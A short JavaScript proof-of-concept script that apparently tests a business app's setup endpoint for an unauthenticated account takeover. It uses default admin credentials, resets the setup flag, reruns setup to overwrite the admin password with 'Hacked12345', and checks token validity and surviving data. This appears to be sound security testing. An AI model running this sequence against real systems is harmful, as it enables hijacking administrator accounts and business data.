import { connect, request, BASE, show } from './lib.mjs';
const a = await connect(BASE,'admin','admin123');
show('setup while completed', await request(BASE,'POST','/auth/setup',{body:{businessName:'X',adminUsername:'admin',adminPassword:'Hacked12345',adminFullName:'H',preferredLanguage:'ar'}}));
show('set setup_completed=false', await a.put('/settings/setup_completed',{value:false}));
const r = await request(BASE,'POST','/auth/setup',{body:{businessName:'Hijack',adminUsername:'admin',adminPassword:'Hacked12345',adminFullName:'H',preferredLanguage:'ar'}});
show('UNAUTH setup reuse of existing admin username', r);
show('login admin/admin123', await request(BASE,'POST','/auth/login',{body:{username:'admin',password:'admin123'}}));
const l = await request(BASE,'POST','/auth/login',{body:{username:'admin',password:'Hacked12345'}}); console.log('login with attacker pw', l.status);
show('old admin token still valid', await a.get('/auth/me'));
show('business_name now', await (await connect(BASE,'admin','Hacked12345')).get('/settings/business_name'));
// data still there?
const b = await connect(BASE,'admin','Hacked12345'); show('sales count', await b.get('/sales?pageSize=1'));
